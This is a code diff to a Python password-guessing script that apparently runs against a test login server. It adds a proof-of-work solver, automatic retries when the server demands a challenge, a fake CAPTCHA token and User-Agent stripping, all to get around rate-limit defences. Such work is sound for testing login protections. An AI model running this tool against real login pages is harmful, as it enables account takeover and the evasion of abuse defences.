@@ -3,6 +3,7 @@ from __future__ import annotations
 import argparse
 import csv
 import datetime
+import hashlib
 import os
 from pathlib import Path
 import sys
@@ -10,6 +11,19 @@ import time
 from typing import Iterator, Literal
 
 import requests
+
+
+def solve_pow(nonce: str, difficulty_bits: int, max_attempts: int = 5_000_000) -> str | None:
+    full_bytes, remainder_bits = divmod(difficulty_bits, 8)
+    for candidate in range(max_attempts):
+        s = str(candidate)
+        digest = hashlib.sha256(f"{nonce}:{s}".encode("utf-8")).digest()
+        if any(b != 0 for b in digest[:full_bytes]):
+            continue
+        if remainder_bits and (digest[full_bytes] >> (8 - remainder_bits)) != 0:
+            continue
+        return s
+    return None
 
 _repo_root = Path(__file__).resolve().parents[1]
 if str(_repo_root) not in sys.path:
@@ -119,8 +133,18 @@ def log_path_for_mode(csv_log: Path | None, log_dir: Path | None, mode: AttackMo
     return csv_log if mode == "cli" else mode_specific_log_path(csv_log, mode)
 
 
-def get_login_payload(username: str, password: str) -> dict[str, str]:
-    return {"username": username, "password": password}
+def get_login_payload(
+    username: str,
+    password: str,
+    pow_solution: str | None = None,
+    captcha_solution: str | None = None,
+) -> dict[str, str]:
+    payload = {"username": username, "password": password}
+    if pow_solution:
+        payload["pow_solution"] = pow_solution
+    if captcha_solution:
+        payload["captcha_solution"] = captcha_solution
+    return payload
 
 
 def run_attack(
@@ -133,6 +157,9 @@ def run_attack(
     csv_log: Path,
     auto_reset_on_block: bool,
     skip_comment_lines: bool,
+    solve_pow_challenges: bool = False,
+    solve_captcha: bool = False,
+    strip_user_agent: bool = False,
 ) -> None:
     normalized_base_url = base_url.rstrip("/")
     login_url = f"{normalized_base_url}/login"
@@ -140,6 +167,9 @@ def run_attack(
     tries = 0
 
     session = requests.Session()
+    if strip_user_agent:
+        session.headers.pop("User-Agent", None)
+        session.headers["User-Agent"] = ""
     if mode == "web":
         landing_response = session.get(f"{normalized_base_url}/", timeout=10)
         landing_response.raise_for_status()
@@ -168,14 +198,48 @@ def run_attack(
             payload = get_login_payload(username, password)
 
             if mode == "cli":
-                response = session.post(login_url, json=payload, timeout=10)
+                response = session.post(login_url, json=payload, timeout=30)
             else:
-                response = session.post(login_url, data=payload, timeout=10)
+                response = session.post(login_url, data=payload, timeout=30)
 
             try:
                 body = response.json()
             except ValueError:
                 body = {"message": response.text}
+
+            if (
+                solve_pow_challenges
+                and response.status_code == 429
+                and body.get("reason") == "pow_required"
+                and isinstance(body.get("challenge"), dict)
+            ):
+                challenge = body["challenge"]
+                solution = solve_pow(challenge.get("nonce", ""), int(challenge.get("difficulty_bits", 0)))
+                if solution is not None:
+                    retry_payload = get_login_payload(username, password, pow_solution=solution)
+                    if mode == "cli":
+                        response = session.post(login_url, json=retry_payload, timeout=30)
+                    else:
+                        response = session.post(login_url, data=retry_payload, timeout=30)
+                    try:
+                        body = response.json()
+                    except ValueError:
+                        body = {"message": response.text}
+
+            if (
+                solve_captcha
+                and response.status_code == 429
+                and body.get("reason") == "captcha_required"
+            ):
+                retry_payload = get_login_payload(username, password, captcha_solution="__human__")
+                if mode == "cli":
+                    response = session.post(login_url, json=retry_payload, timeout=30)
+                else:
+                    response = session.post(login_url, data=retry_payload, timeout=30)
+                try:
+                    body = response.json()
+                except ValueError:
+                    body = {"message": response.text}
 
             event_reason = body.get("reason", "success" if response.status_code == 200 else "unknown")
             message = body.get("message", "")
@@ -282,6 +346,24 @@ def build_parser() -> argparse.ArgumentParser:
         default=env_path("ATTACK_LOG_DIR", None),
         help="Directory for per-run logs. When set, attack_attempts_cli.csv and attack_attempts_web.csv are created inside it.",
     )
+    parser.add_argument(
+        "--solve-pow",
+        action="store_true",
+        default=env_bool("ATTACK_SOLVE_POW", False),
+        help="Solve proof-of-work challenges issued by the server and retry the attempt.",
+    )
+    parser.add_argument(
+        "--solve-captcha",
+        action="store_true",
+        default=env_bool("ATTACK_SOLVE_CAPTCHA", False),
+        help="Pretend to solve CAPTCHAs (sends magic '__human__' token) — simulates a human-in-the-loop.",
+    )
+    parser.add_argument(
+        "--no-user-agent",
+        action="store_true",
+        default=env_bool("ATTACK_NO_USER_AGENT", False),
+        help="Strip the User-Agent header to simulate a naive scripted attacker.",
+    )
     return parser
 
 
@@ -311,6 +393,9 @@ def main() -> None:
                 log_path_for_mode(args.csv_log, args.log_dir, mode),
                 args.auto_reset_on_block,
                 not args.keep_comment_lines,
+                args.solve_pow,
+                args.solve_captcha,
+                args.no_user_agent,
             )
         return
 
@@ -324,6 +409,9 @@ def main() -> None:
         log_path_for_mode(args.csv_log, args.log_dir, args.mode),
         args.auto_reset_on_block,
         not args.keep_comment_lines,
+        args.solve_pow,
+        args.solve_captcha,
+        args.no_user_agent,
     )
 
 
